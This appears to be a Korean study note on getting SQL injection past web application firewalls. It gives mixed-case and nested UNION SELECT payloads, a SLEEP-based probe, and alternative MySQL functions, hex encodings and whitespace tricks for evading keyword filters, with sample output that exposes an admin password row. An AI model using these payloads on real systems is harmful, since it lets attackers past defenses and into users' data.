WAF(Web Application Firewall, 웹 방화벽) Bypass :
    WAF와 같이 웹 해킹에서 주로 공격 시 사용하는 키워드들에 대해 방어하는 시스템이 존재하는 경우가 있습니다.

    주요 키워드 사용을 차단하기 때문에 SQL Injection 취약점이 발생하더라도 공격 코드들이 정상적으로 실행되지 못하는 경우도 발생합니다. 
    하지만 SQL은 다양한 함수와 형태를 지원하는 언어이므로 다양한 방법을 통해 우회할 수 있는 경우들이 있습니다.

    WAF또는 특정 키워드를 방어하는 방식은 공격의 리소스를 증가시키지만, 근본적인 취약점은 해결하지 못합니다.

    1) String Case Issue
        UnIoN SeLecT 1,2,3 -- -
        selECT SlEep(5) #

    2) 탐지 시 처리 미흡
        악성 키워드 탐지 시 해당 요청을 차단하지 않고 문자열을 변환하는 등의 과정을 거친 후 처리하는 경우 발생할 수 있습니다.

        UNunionION SELselectECT 1,2 --
        # => UNION SELECT 1,2 --  

    3) 대체 가능한 키워드 필터
        # MySQL
        # 특정 함수 이름 탐지
        SELECT substr('abc', 1, 1); # "a"
        SELECT mid('abc', 1, 1);    # "a"
        SELECT lpad('abc', 1, 1);   # "a"
        
        # "admin" 문자열 탐지
        mysql> SELECT reverse('nimda'), concat('adm','in'), x'61646d696e', 0x61646d696e;
        /*
        +------------------+--------------------+---------------+--------------+
        | reverse('nimda') | concat('adm','in') | x'61646d696e' | 0x61646d696e |
        +------------------+--------------------+---------------+--------------+
        | admin            | admin              | admin         | admin        |
        +------------------+--------------------+---------------+--------------+
        1 row in set (0.00 sec)
        */
        
        # 특정 연산자 탐지 (아래의 연산자 이외에도 연산자들이 존재할 수 있음.)
        ^, =, !=, %, /, *, &, &&, |, ||, >, <, XOR, DIV, LIKE, RLIKE, REGEXP, IS, IN, NOT, MATCH, AND, OR, BETWEEN, ISNULL
        
        # 화이트 스페이스 탐지
        /*
        Ascii 9(Horizontal Tab), 10(Line Feed), 11(Vertical Tab), 12(Form Feed), 13(Carriage Return), 32(Space)
        */
        
        mysql> SELECT/**/'abc';
        /*
        +-----+
        | abc |
        +-----+
        | abc |
        +-----+
        1 row in set (0.00 sec)
        */
        
        mysql> select`username`,(password)from`users`WHERE`username`='admin';
        /*
        +----------+----------------+
        | username | password       |
        +----------+----------------+
        | admin    | admin_password |
        +----------+----------------+
        1 row in set (0.00 sec)
        */

        




























